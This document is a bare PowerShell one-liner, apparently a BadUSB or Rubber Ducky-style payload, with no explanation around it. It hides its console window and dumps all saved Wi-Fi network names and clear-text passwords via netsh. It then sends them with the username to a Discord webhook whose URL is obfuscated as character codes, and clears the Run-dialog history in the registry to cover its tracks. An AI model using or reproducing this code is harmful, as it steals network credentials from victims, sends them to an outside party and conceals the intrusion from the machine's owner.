$a='using System;using System.Runtime.InteropServices;public class Win{[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();}';Add-Type -TypeDefinition $a;$w=[Win]::GetConsoleWindow();[Win]::ShowWindow($w,0)|Out-Null;$h=([char[]]([int[]]@(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,57,53,49,57,51,54,56,48,52,51,49,57,52,51,56,55,49,47,73,111,56,99,57,78,73,115,122,109,65,110,105,117,117,81,100,108,119,101,99,109,53,85,81,76,110,65,122,99,49,77,88,112,105,99,103,89,49,106,119,102,117,108,106,68,75,79,122,69,53,68,87,49,113,121,82,53,53,116,121,121,109,122,106,51,52,95))) -join'';$m=(netsh wlan show profiles|Select-String "All User Profile"|ForEach-Object{$_ -replace "^\s+All User Profile\s+:\s+",""}|ForEach-Object{netsh wlan show profiles $_ key=clear|Select-String "SSID name","Key Content"}) -join"`n";try{$u=if($env:username){$env:username}else{'unknown'}}catch{$u='unknown'};try{Invoke-RestMethod -ErrorAction SilentlyContinue -ContentType 'application/json' -Uri $h -Method Post -Body (@{username=$u;content=$m.Substring(0,[Math]::Min(1900,$m.Length))}|ConvertTo-Json)|Out-Null}catch{};Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue
